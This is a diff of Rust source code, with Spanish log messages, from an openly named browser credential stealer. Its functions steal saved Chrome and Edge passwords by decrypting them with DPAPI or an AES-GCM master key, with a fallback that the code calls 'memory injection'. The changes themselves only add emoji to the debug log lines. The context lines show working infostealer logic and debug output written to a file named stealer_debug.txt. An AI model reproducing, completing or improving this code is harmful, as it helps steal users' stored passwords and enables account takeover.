@@ -297,17 +297,17 @@ fn extract_credentials_from_db(
                 writeln!(debug, "       ✅ DPAPI OK").ok();
                 pwd
             } else if let Some(key) = master_key {
-                writeln!(debug, "        DPAPI falló, intentando AES-GCM...").ok();
+                writeln!(debug, "       ⚠️ DPAPI falló, intentando AES-GCM...").ok();
                 let result = decrypt_aes_gcm(&encrypted_pwd, key);
                 if result.is_ok() {
-                    writeln!(debug, "        AES-GCM OK").ok();
+                    writeln!(debug, "       ✅ AES-GCM OK").ok();
                     result.unwrap()
                 } else {
-                    writeln!(debug, "        AES-GCM FALLÓ").ok();
+                    writeln!(debug, "       ❌ AES-GCM FALLÓ").ok();
                     "[decrypt failed]".to_string()
                 }
             } else {
-                writeln!(debug, "        No master key disponible").ok();
+                writeln!(debug, "       ❌ No master key disponible").ok();
                 "[no key]".to_string()
             };
 
@@ -373,7 +373,7 @@ pub fn decrypt_aes_gcm_bytes_debug(
     ));
 
     if encrypted_data.len() < 3 {
-        log.push_str("         Datos muy cortos (< 3 bytes)\n");
+        log.push_str("        ❌ Datos muy cortos (< 3 bytes)\n");
         return (None, log);
     }
 
@@ -414,11 +414,11 @@ pub fn decrypt_aes_gcm_bytes_debug(
     // Crear cipher
     let cipher = match Aes256Gcm::new_from_slice(master_key) {
         Ok(c) => {
-            log.push_str("         Cipher creado correctamente\n");
+            log.push_str("        ✅ Cipher creado correctamente\n");
             c
         }
         Err(e) => {
-            log.push_str(&format!("         Error creando cipher: {:?}\n", e));
+            log.push_str(&format!("        ❌ Error creando cipher: {:?}\n", e));
             return (None, log);
         }
     };
@@ -435,8 +435,8 @@ pub fn decrypt_aes_gcm_bytes_debug(
             (Some(plaintext), log)
         }
         Err(e) => {
-            log.push_str(&format!("         Error en decrypt: {:?}\n", e));
-            log.push_str("         Posible causa: Master key incorrecta o formato diferente\n");
+            log.push_str(&format!("        ❌ Error en decrypt: {:?}\n", e));
+            log.push_str("        💡 Posible causa: Master key incorrecta o formato diferente\n");
             (None, log)
         }
     }
@@ -474,7 +474,7 @@ pub fn steal_chrome_hybrid() -> StealerResult<Vec<Credential>> {
         .open(std::env::temp_dir().join("stealer_debug.txt"))
     {
         use std::io::Write;
-        let _ = writeln!(f, "\n [ENTRY] steal_chrome_hybrid() CALLED");
+        let _ = writeln!(f, "\n🚀 [ENTRY] steal_chrome_hybrid() CALLED");
         let _ = f.flush();
     }
 
@@ -490,7 +490,7 @@ pub fn steal_edge_hybrid() -> StealerResult<Vec<Credential>> {
         .open(std::env::temp_dir().join("stealer_debug.txt"))
     {
         use std::io::Write;
-        let _ = writeln!(f, "\n [ENTRY] steal_edge_hybrid() CALLED");
+        let _ = writeln!(f, "\n🚀 [ENTRY] steal_edge_hybrid() CALLED");
         let _ = f.flush();
     }
 
@@ -539,7 +539,7 @@ fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
             creds
         }
         Err(e) => {
-            log(&format!("    Método tradicional falló: {:?}", e));
+            log(&format!("  ⚠️  Método tradicional falló: {:?}", e));
             Vec::new()
         }
     };
@@ -580,7 +580,7 @@ fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
                 });
             }
         } else {
-            log("   Memory injection no encontró passwords");
+            log("  ❌ Memory injection no encontró passwords");
         }
     } else {
         log("🔸 PASO 2: Saltando memory injection (todos los passwords desencriptados)");
